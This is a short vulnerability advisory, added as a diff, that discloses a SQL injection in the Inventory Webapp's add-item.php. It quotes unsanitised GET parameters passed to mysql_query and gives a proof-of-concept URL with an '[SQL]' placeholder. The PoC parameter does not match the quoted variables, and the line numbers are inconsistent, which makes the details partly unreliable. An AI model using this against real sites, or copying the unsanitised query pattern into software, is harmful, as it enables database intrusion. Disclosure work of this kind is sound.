@@ -1,0 +1,37 @@
+# Exploit Title: Inventory Webapp SQL injection
+# Data: 05.09.2019
+# Exploit Author: mohammad zaheri
+# Vendor HomagePage: https://github.com/edlangley/inventory-webapp
+# Tested on: Windows
+# Google Dork: N/A
+
+
+=========
+Vulnerable Page:
+=========
+/php/add-item.php
+
+
+==========
+Vulnerable Source:
+==========
+Line39: $name = $_GET["name"];
+Line39: $description = $_GET["description"];
+Line39: $quantity = $_GET["quantity"];
+Line39: $cat_id = $_GET["cat_id"];
+Line49: if(mysql_query($itemquery, $conn))
+
+
+
+=========
+POC:
+=========
+http://site.com/php/add-item.php?itemquery=[SQL]
+
+
+
+=========
+Contact Me :
+=========
+Telegram : @m_zhrii
+Email : neoboy503@gmail.com
